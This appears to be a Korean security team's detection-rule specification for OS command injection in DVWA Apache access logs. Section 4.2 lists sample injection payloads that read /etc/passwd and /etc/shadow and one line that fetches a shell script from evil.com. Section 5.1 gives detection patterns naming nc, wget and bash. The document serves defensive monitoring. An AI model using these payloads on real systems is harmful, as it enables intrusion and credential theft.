# WEB-CMD-001: Command Injection Detection Rule

## 1. 탐지 룰 개요

- **Rule ID**: WEB-CMD-001
- **공격 유형**: Command Injection / OS Command Injection
- **공격 분류**: Injection
- **로그 소스**: DVWA Apache access log
- **적용 단계**: Logstash (Classification / Enrichment)

---

## 2. 위협 시나리오 (Threat Scenario)

### 2.1 위협 개요

Command Injection은 웹 애플리케이션을 통해 **운영체제 명령어를 실행**시키는 공격이다. 성공 시 서버의 완전한 제어권을 획득할 수 있어 가장 위험한 취약점 중 하나이다.

본 룰은 다음과 같은 시나리오를 탐지하기 위해 설계되었다.

- **직접 명령 실행**
    - 시스템 명령어 직접 실행
    - 파일 읽기/쓰기/삭제
    - 네트워크 연결 생성
- **명령어 체이닝**
    - 세미콜론(;), 파이프(|), 논리 연산자(&&, ||)
    - 백틱(`), 명령어 치환 $()
    - 여러 명령 연속 실행
- **리버스 쉘**
    - nc, bash, python을 통한 백도어
    - 원격 제어 채널 생성

### 2.2 보호 대상 자산과 영향

| 자산 | 영향 |
|------|------|
| 운영체제 | Complete system compromise |
| 서버 파일 | Read/Write/Delete access |
| 네트워크 | Lateral movement |
| 기밀 데이터 | Full exposure |

---

## 3. 관측 신호 (Observable Signals)

### 3.1 로그 기반 관측 가능 지점

본 공격 시나리오는 **Apache access log**에서 다음 신호로 관측 가능하다.

- 요청 URL의 **query string**
- 명령어 체이닝 문자
- 시스템 명령어
- URL 인코딩된 명령어

### 3.2 주요 관측 필드

| 필드 | 설명 |
|------|------|
| url.query | 명령어 페이로드 |
| url.original | 전체 요청 URL |
| http.request.method | 요청 메서드 |
| http.response.status_code | 응답 코드 |
| source.ip | 공격 주체 IP |

---

## 4. 탐지 근거 (Detection Rationale)

본 탐지 룰은 다음 근거를 기반으로 정의되었다.

### 4.1 표준 및 권장 사항

#### OWASP Top 10

- **A03:2021 – Injection**

#### CWE-78

- https://cwe.mitre.org/data/definitions/78.html
- OS Command Injection

### 4.2 프로젝트 실험 근거

DVWA Command Injection 모듈:

```
127.0.0.1; ls -la
127.0.0.1 | cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 || id
`cat /etc/shadow`
$(wget http://evil.com/shell.sh)
```

---

## 5. 탐지 조건 (Detection Conditions)

### 5.1 탐지 패턴

#### Command Separators
```
;
|
&&
||
`
$()
```

#### Common Commands
```
whoami, id, ls, cat, pwd
uname, hostname, ifconfig
wget, curl, nc
bash, sh, python
```

---

## 6. 위험도 평가

- **attack_severity**: High
- **CVSS Score**: 9.8 (Critical)
- **즉각적인 시스템 제어권 상실 위험**

---

## 7. 대응 전략

### 7.1 초기 대응

- 즉시 모니터링 강화
- 단일 이벤트도 위험 신호

### 7.2 2차 대응

- 1분 10회 이상: Critical Alert
- 즉시 IP 차단
- 침해 사고 대응 절차

---

## 8. 예방 조치

- 입력값 검증 및 삭제
- 시스템 명령 사용 금지
- 최소 권한 원칙
- 컨테이너 격리

---

## 9. 참고 자료

- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **CWE-78**: https://cwe.mitre.org/data/definitions/78.html

---

## 10. 변경 이력

| 버전 | 날짜 | 변경 내용 | 작성자 |
|------|------|----------|--------|
| v1.0 | 2026-01-02 | 초기 룰 작성 | 2SeC Team |